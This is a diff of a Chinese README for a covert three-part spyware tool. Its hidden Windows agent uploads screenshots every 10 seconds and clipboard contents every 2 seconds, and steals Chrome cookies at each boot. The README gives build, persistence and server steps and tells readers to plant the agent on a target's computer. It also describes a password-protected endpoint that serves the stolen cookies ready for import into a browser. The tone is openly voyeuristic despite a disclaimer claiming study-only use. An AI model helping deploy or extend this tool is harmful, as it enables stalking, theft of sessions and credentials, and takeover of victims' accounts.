@@ -1,35 +1,108 @@
 # 我会一直视奸你
-> 一直、一直、一直
+> 一直、一直、一直。
 
-### demo site：[http://amywxd.site:3090](http://amywxd.site:3090)
+一款功能强大的三端远程监控工具，用于学习与技术研究。
 
-## 一款三端的视奸工具
-功能是每10s截一张屏幕上传，每2s上传剪贴板内容，每次开机获取Chrome浏览器cookie并上传。
+**[➡️ 访问演示站点](http://amywxd.site:3090)**
 
-### 被视奸方-agent
+---
 
-- 适用于`Windows`
-- 记得修改源码中服务器地址，如果syso文件不可用，请自行 `rsrc -manifest`
-- 编译: `go mod tidy`
-  - `go build -ldflags="-H=windowsgui"`
-  - 命令行参数-H=windowsgui可以隐藏终端       
-- 用[你的办法](http://amywxd.site:3090)埋好雷把软件放到ta电脑上
-- git编译时务必同时保存`.bat`和`.vbs`以及`cookie_ext.exe`文件，因为go要内嵌
-- 放行运行一次`monitor-agent.exe`，即可持久化
+## ✨ 功能特性
 
-### 服务器-server
+- **屏幕监控**: 每 10 秒捕获并上传目标屏幕截图。
+- **剪贴板记录**: 每 2 秒记录并上传剪贴板内容。
+- **Cookie 获取**: 每次开机时自动抓取 Chrome 浏览器 Cookie 并上传。
+- **隐蔽持久**: Agent 在 Windows 平台以后台模式运行，并实现开机自启持久化。
+- **跨平台查看**: 配套的查看端 `SyncViewer` 支持 `macOS` 和 `Windows`。
 
-- 需要CGO_ENABLED，所以不建议交叉编译。
-- 在你服务器上：`go mod tidy`
-    - `go build -o monitor-server main.go`
-- 记得配好端口(默认5656)，然后`nohup ./monitor-server &`就完事了
-> 下面这条有点争议，可在源码中修改PASSWORD
-- 由于另外获取了cookies，所以可以通过`/api/cookies?pwd=PASSWORD`获取浏览器cookies
-  - 且返回方式是以domain分组好的，可直接导入浏览器使用
+---
 
-### 阴暗的保安-SyncViewer
+## 🛠️ 系统架构
 
-- 需要`wails`环境。
-- 适用于`macOS`，`Windows`
-- 在`app.go`中修改服务器地址
-- `wails build`后再`build/bin`文件夹下就能找到软件了，打开就能美美视奸对面了。
+本工具由三个核心部分组成：
+
+1.  **`Agent` (被视奸方)**
+    - 在目标 `Windows` 设备上运行，负责静默收集数据并发送到服务器。
+
+2.  **`Server` (服务器)**
+    - 部署在您的云服务器上，用于接收、存储和提供来自 Agent 的所有数据。
+
+3.  **`SyncViewer` (阴暗的保安)**
+    - 在您自己的 `macOS` 或 `Windows` 电脑上运行，用于实时查看所有监控数据。
+
+---
+
+## 🚀 部署指南
+
+请遵循以下步骤分别部署三个组件。
+
+### 🖥️ Agent (被视奸方)
+
+此组件用于部署到目标设备。
+
+- **适用平台**: `Windows`
+- **部署步骤**:
+    1.  **配置源码**: 在编译前，必须修改源码中的服务器 `URL` 地址，使其指向您的 `Server` 地址。
+    2.  **内嵌资源**:
+        - 确保 `.bat`、`.vbs` 和 `cookie_ext.exe` 文件与 Go 源码位于同一目录，以便编译时能正确内嵌。
+        - 如果 `syso` 文件不可用或需要修改，请自行使用 `rsrc -manifest` 等工具重新生成。
+    3.  **编译**:
+        ```bash
+        # 拉取依赖
+        go mod tidy
+
+        # 编译程序，-H=windowsgui 参数可以隐藏运行时产生的命令行窗口
+        go build -ldflags="-H=windowsgui"
+        ```
+    4.  **部署**: 通过您的方法将编译好的 `monitor-agent.exe` 放置到目标电脑上。
+    5.  **启动与持久化**: 首次运行 `monitor-agent.exe` 后，程序将自动配置并实现开机自启。
+
+### ☁️ Server (服务器)
+
+此组件用于接收和管理数据。
+
+- **环境要求**:
+    - 需要启用 CGO (`CGO_ENABLED=1`)，因此强烈建议在目标服务器环境（如 Linux）上直接编译，而非交叉编译。
+- **部署步骤**:
+    1.  **拉取依赖**:
+        ```bash
+        go mod tidy
+        ```
+    2.  **编译**:
+        ```bash
+        go build -o monitor-server main.go
+        ```
+    3.  **配置与运行**:
+        - 确保您的服务器防火墙已放行程序所需端口（默认为 `5656`）。
+        - 使用 `nohup` 命令使其在后台持久运行：
+        ```bash
+        nohup ./monitor-server &
+        ```
+- **API 接口**:
+    - **获取 Cookies**:
+        > ⚠️ 注意: 请务必在源码中修改默认的 `PASSWORD` 以确保接口安全。
+        - 通过访问 `http://<你的服务器地址>:5656/api/cookies?pwd=你的密码` 来获取所有已收集的浏览器 Cookies。
+        - 返回的数据已按域名分组，可直接用于浏览器插件（如 EditThisCookie）进行导入。
+
+### 🕵️ SyncViewer (阴暗的保安)
+
+此组件用于在您自己的电脑上查看数据。
+
+- **适用平台**: `macOS`, `Windows`
+- **环境要求**: 需要预先安装并配置好 `Wails` 开发环境。
+- **部署步骤**:
+    1.  **配置源码**: 在 `app.go` 文件中，修改服务器 `URL` 地址，使其指向您的 `Server`。
+    2.  **构建应用**:
+        ```bash
+        # 使用 Wails CLI 构建应用
+        wails build
+        ```
+    3.  **运行**:
+        - 构建成功后，可在项目下的 `build/bin` 文件夹中找到适用于您当前系统的可执行文件。
+        - 直接打开，即可开始美美地视奸对面了。
+
+---
+
+## ⚠️ 免责声明
+
+本项目仅供技术学习和安全研究使用，请在授权情况下进行测试。严禁用于任何非法用途，任何由此产生的法律风险和后果由使用者本人承担。
